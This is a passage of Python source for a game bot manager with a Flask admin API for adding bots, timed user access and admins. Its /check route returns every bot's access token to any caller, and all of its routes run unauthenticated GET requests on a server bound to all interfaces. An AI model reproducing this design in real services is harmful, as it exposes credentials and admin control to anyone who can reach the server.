   if bot_id in self.bots:
    bot = self.bots[bot_id]
    if is_add: bot.send_noti_to_user(True, uid, expire_time)
    else: bot.send_noti_to_user(False, uid)
  except Exception as e:
   pass

 def add_uid_to_access(self, bot_id, uid, time_str):
  with self.config_lock:
   for bot in self.config["bots"]:
    if bot["bot_id"] == bot_id:
     if "access_bot" not in bot:
      bot["access_bot"] = []
     try: uid = int(uid)
     except ValueError: return "invalid_params"
     expire_time = self.parse_expire_time(time_str)
     if not expire_time: return "invalid_time"
     found = False
     for u in bot["access_bot"]:
      if u["uid"] == uid:
       try:
        old_dt = datetime.datetime.strptime(u["expire"], "%Y-%m-%d %H:%M:%S")
        new_dt = datetime.datetime.strptime(expire_time, "%Y-%m-%d %H:%M:%S")
        duration = new_dt - datetime.datetime.now()
        u["expire"] = (old_dt + duration).strftime("%Y-%m-%d %H:%M:%S")
       except:u["expire"] = expire_time
       found = True
       break
     if not found:
      bot["access_bot"].append({"uid": uid, "expire": expire_time})
     if bot_id in self.bots:
      self.bots[bot_id].bot_config = bot
      self.save_config()
      return True
  return False

 def deleteId(self, bot_id, uid):
  with self.config_lock:
   try:
    uid = int(uid)
   except ValueError:
    return False
   for bot in self.config["bots"]:
    if bot["bot_id"] == bot_id:
     access = bot.get("access_bot", [])
     new_access = [u for u in access if u["uid"] != uid]
     if len(new_access) != len(access):
      bot["access_bot"] = new_access
      if bot_id in self.bots:
       self.bots[bot_id].bot_config = bot
       self.save_config()
      return True
     return False
  return False

 def auto_cleanup_expired_users(self):
  while True:
   try:
    now = datetime.datetime.now()
    total_cleaned = 0
    with self.config_lock:
     for bot_config in self.config["bots"]:
      bot_id = bot_config["bot_id"]
      bot_name = bot_config.get("nickname", f"Bot_{bot_id}")
      expired_users = []
      for user in bot_config.get("access_bot", []):
       try:
        e = datetime.datetime.strptime(user["expire"], "%Y-%m-%d %H:%M:%S")
        if e < now: expired_users.append(user["uid"])
       except Exception as e: expired_users.append(user.get("uid"))
      if expired_users:
       bot_config["access_bot"] = [
        u for u in bot_config["access_bot"] 
        if u["uid"] not in expired_users
       ]
       if bot_id in self.bots:
        self.bots[bot_id].bot_config = bot_config
       total_cleaned += len(expired_users)
     if total_cleaned > 0: self.save_config()
     else: print()
    
   except Exception as e:
    import traceback
    traceback.print_exc()
   time.sleep(3600)

TCPbot = BOTMNG()
app = Flask(__name__)

@app.route("/check", methods=["GET"])
def ktr_bot():
 data = []
 for bid, bot in TCPbot.bots.items():
  I={
   "id": bid,
   "access-token": bot.bot_config['auth_bot_login']['access_token'],
   "access-user": bot.bot_config.get('access_bot', []),
   "bot-id": bot.bot_config.get("botid", getattr(bot, "botid", None)),
   "nickname": bot.bot_config.get('nickname', getattr(bot, 'nickname', None)),
   "active-guild?": bot.bot_config.get("active-clan", True),
   "status": "active" if bot.running_event.is_set() else "Inactive"
  }
  data.append(I)
 return jsonify({"data": data, "total": len(data)})

@app.route("/addid", methods=["GET"])
def add_uid():
 bid = request.args.get("id")
 uid = request.args.get("uid")
 timee = request.args.get("time")
 if not bid or not uid or not timee: return "RES_INVALID", 201
 try:bid = int(bid)
 except:return "RES_INVALID_ID", 201
 I=TCPbot.add_uid_to_access((bid), int(uid), timee)
 if I == True: return "RES_OK", 200
 elif I == "invalid_time": return "RES_INVALID_TIME", 201
 elif I == "invalid_params": return "RES_INVALID_PARAMS", 201
 else:return "RES_FAILED", 201

@app.route("/delid", methods=["GET"])
def delete_uid():
 bid = request.args.get("botid")
 uid = request.args.get("uid")
 if not bid or not uid:return "RES_INVALID", 201
 try:bid = int(bid)
 except:return "RES_INVALID_ID", 201
 I=TCPbot.deleteId(bid, uid)
 if I:return "RES_OK", 200
 else:return "RES_FAILED", 201

@app.route("/addbot", methods=["GET"])
def add_bot():
 token = request.args.get("token")
 if not token: return "RES_INVALID", 201
 I=TCPbot.add_bot(token)
 if I["status"]:
  TCPbot.bots[I["bot_id"]].start()
  return "RES_OK", 200
 else: return str(I["message"]), 201

@app.route("/delbot", methods=["GET"])
def delete_bot():
 bid = int(request.args.get("botid"))
 if not bid: return "RES_INVALID", 201
 I=TCPbot.delete_bot(bid)
 if I:return "RES_OK", 200
 else: return "RES_BOT_NOT_FOUND", 201

@app.route("/addadmin", methods=["GET"])
def add_admin():
 bid = request.args.get("botid")
 aid = request.args.get("uid")
 if not bid or not aid: return "RES_INVALID", 201
 try:
  bid = int(bid)
  aid = int(aid)
 except Exception as e: return str(e), 201
 I=AdminManager.add_admin(bid, aid)
 if I:return "RES_OK", 200
 else: return "RES_ADMIN_ALREADY_EXISTS", 201

def sbot():
 for bot in TCPbot.bots.values(): bot.start()

if __name__ == "__main__":
 threading.Thread(target=sbot).start()
 app.run(host="0.0.0.0", port=2010)